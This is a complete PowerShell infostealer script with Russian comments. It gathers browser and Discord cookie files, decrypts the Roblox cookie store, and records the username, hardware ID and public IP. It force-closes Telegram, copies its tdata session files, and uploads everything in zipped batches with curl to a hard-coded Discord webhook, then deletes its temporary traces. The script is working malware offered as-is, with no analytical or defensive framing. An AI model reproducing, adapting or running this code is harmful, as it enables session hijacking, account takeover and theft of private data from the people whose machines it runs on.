$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
$d = "$env:TEMP\$hwid"
if (Test-Path $d) { Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -Path $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# Сбор кук (без изменений)
$found = @()
$searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))
foreach ($base in $searchPaths) {
    if (Test-Path $base) {
        $files = Get-ChildItem -Path $base -Recurse -Filter 'Cookies' -File -ErrorAction SilentlyContinue |
            Where-Object { $_.DirectoryName -and ($_.DirectoryName -match 'discord|chrome|edge|brave|opera|vivaldi|firefox|mozilla|ntfloader|ebwebview|webview' -or $_.FullName -match 'Cookies$') }
        if ($files) { $found += $files }
    }
}
foreach ($f in $found) {
    if (-not $f) { continue }
    $src = $f.FullName
    $name = "unknown_cookie.cookies"
    try {
        if ($f.Directory.Parent -and $f.Directory.Name) {
            $name = $f.Directory.Parent.Name + '_' + $f.Directory.Name + '.cookies'
        } elseif ($f.Directory.Name) {
            $name = $f.Directory.Name + '.cookies'
        }
        if ($name.Length -gt 60 -and $f.Directory.Parent -and $f.Directory.Parent.Parent -and $f.Directory.Parent.Name) {
            $name = $f.Directory.Parent.Parent.Name + '_' + $f.Directory.Parent.Name + '.cookies'
        }
    } catch {
        $name = [System.IO.Path]::GetFileName($src) + '_' + (Get-Random -Max 9999) + '.cookies'
    }
    $dest = Join-Path $d $name
    try { Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop } catch {}
}

# Roblox
$rob = $env:LOCALAPPDATA + '\Roblox\LocalStorage\RobloxCookies.dat'
if (Test-Path $rob) {
    Copy-Item $rob "$d\RobloxCookies.dat" -Force -ErrorAction SilentlyContinue
    try {
        $c = Get-Content $rob -Raw | ConvertFrom-Json -ErrorAction Stop
        if ($c -and $c.CookiesData) {
            $b = [Convert]::FromBase64String($c.CookiesData)
            Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
            $s = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')
            $t = [Text.Encoding]::UTF8.GetString($s)
            $t | Out-File "$d\RobloxCookies_decrypted.txt" -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Инфо
$u = $env:USERNAME
try { $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction Stop).Content } catch { $i = "IP_NOT_FOUND" }
"User: $u`nHWID: $hwid`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue

# Архив и отправка кук
$zip = "$env:TEMP\$hwid.zip"
if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
Add-Type -AssemblyName System.IO.Compression.FileSystem
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
} catch {
    if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx9 -bso0 -bsp0
    } elseif (Test-Path "${env:ProgramFiles(x86)}\7-Zip\7z.exe") {
        & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx9 -bso0 -bsp0
    }
}
if (Test-Path $zip) {
    curl.exe -s -F "file=@$zip" $webhook
}
Remove-Item $zip -Force -ErrorAction SilentlyContinue
Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue

# ===== НОВАЯ ЧАСТЬ: Telegram tdata с закрытием процесса и проверками =====
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    Write-Host "Обнаружен Telegram. Закрываю процесс..." -ForegroundColor Yellow
    
    # Закрываем Telegram
    try {
        Get-Process -Name "Telegram" -ErrorAction SilentlyContinue | Stop-Process -Force
        Get-Process -Name "TelegramDesktop" -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Seconds 3
    } catch {}

    $tgRoot = "$env:TEMP\Telegram_$hwid"
    if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -Path $tgRoot -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

    # Функция копирования с повторными попытками
    function SafeCopy {
        param($Source, $Destination, $MaxAttempts = 5)
        $attempt = 0
        while ($attempt -lt $MaxAttempts) {
            try {
                Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
                return $true
            } catch {
                $attempt++
                if ($attempt -ge $MaxAttempts) {
                    Write-Host "Не удалось скопировать: $Source" -ForegroundColor Red
                    return $false
                }
                Start-Sleep -Milliseconds 500
            }
        }
        return $false
    }

    # 1. Папка D877F783D5D3EF8C
    $specialDir = Join-Path $tgPath "D877F783D5D3EF8C"
    if (Test-Path $specialDir) {
        $files = Get-ChildItem -Path $specialDir -File -ErrorAction SilentlyContinue
        $counter = 1
        $destDir = Join-Path $tgRoot "tdata_D877F783D5D3EF8C"
        if ($files.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
        foreach ($f in $files) {
            $destFile = Join-Path $destDir "$($f.Name)_$counter"
            SafeCopy -Source $f.FullName -Destination $destFile
            $counter++
        }
    }

    # 2. user_data/cache
    $cacheDir = Join-Path $tgPath "user_data\cache"
    if (Test-Path $cacheDir) {
        $items = Get-ChildItem -Path $cacheDir -Directory -ErrorAction SilentlyContinue
        $counter = 1
        $destDir = Join-Path $tgRoot "tdata_userdata_cache"
        if ($items.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
        foreach ($item in $items) {
            $subItems = Get-ChildItem -Path $item.FullName -File -ErrorAction SilentlyContinue
            foreach ($sub in $subItems) {
                $destFile = Join-Path $destDir "$($sub.Name)_$counter"
                SafeCopy -Source $sub.FullName -Destination $destFile
                $counter++
            }
        }
    }

    # 3. user_data/media_cache
    $mediaCacheDir = Join-Path $tgPath "user_data\media_cache"
    if (Test-Path $mediaCacheDir) {
        $items = Get-ChildItem -Path $mediaCacheDir -Directory -ErrorAction SilentlyContinue
        $counter = 1
        $destDir = Join-Path $tgRoot "tdata_userdata_mediacache"
        if ($items.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
        foreach ($item in $items) {
            $subItems = Get-ChildItem -Path $item.FullName -File -ErrorAction SilentlyContinue
            foreach ($sub in $subItems) {
                $destFile = Join-Path $destDir "$($sub.Name)_$counter"
                SafeCopy -Source $sub.FullName -Destination $destFile
                $counter++
            }
        }
    }

    # 4. Корневые файлы tdata
    $rootFiles = Get-ChildItem -Path $tgPath -File -ErrorAction SilentlyContinue
    $counter = 1
    $destDir = Join-Path $tgRoot "tdata"
    if ($rootFiles.Count -gt 0 -and -not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force | Out-Null }
    foreach ($f in $rootFiles) {
        $destFile = Join-Path $destDir "$($f.Name)_$counter"
        SafeCopy -Source $f.FullName -Destination $destFile
        $counter++
    }

    # Отправка собранных файлов (батчами по 7 МБ)
    $tgFiles = Get-ChildItem -Path $tgRoot -Recurse -File
    if ($tgFiles.Count -gt 0) {
        Write-Host "Собрано $($tgFiles.Count) файлов из Telegram. Отправляю..." -ForegroundColor Cyan
        
        $batch = @()
        $batchSize = 0
        $batchId = 1
        foreach ($tf in $tgFiles) {
            $fsize = $tf.Length
            if ($fsize -le 4MB) {
                if ($batchSize + $fsize -gt 7MB -and $batch.Count -gt 0) {
                    $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
                    New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                    foreach ($bf in $batch) {
                        $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
                        $destFile = Join-Path $batchDir $relPath
                        $destDir = Split-Path $destFile -Parent
                        if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                        Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
                    }
                    $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
                    try {
                        [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
                    } catch {}
                    if (Test-Path $batchZip) {
                        curl.exe -s -F "file=@$batchZip" $webhook
                    }
                    Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
                    Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
                    $batch = @()
                    $batchSize = 0
                    $batchId++
                }
                $batch += $tf
                $batchSize += $fsize
            } else {
                $tempFile = "$env:TEMP\$($tf.Name)"
                Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
                curl.exe -s -F "file=@$tempFile" $webhook
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            }
        }
        if ($batch.Count -gt 0) {
            $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
            New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
            foreach ($bf in $batch) {
                $relPath = $bf.FullName.Substring($tgRoot.Length + 1)
                $destFile = Join-Path $batchDir $relPath
                $destDir = Split-Path $destFile -Parent
                if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
            }
            $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
            try {
                [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
            } catch {}
            if (Test-Path $batchZip) {
                curl.exe -s -F "file=@$batchZip" $webhook
            }
            Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
            Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    Remove-Item $tgRoot -Recurse -Force -ErrorAction SilentlyContinue
}
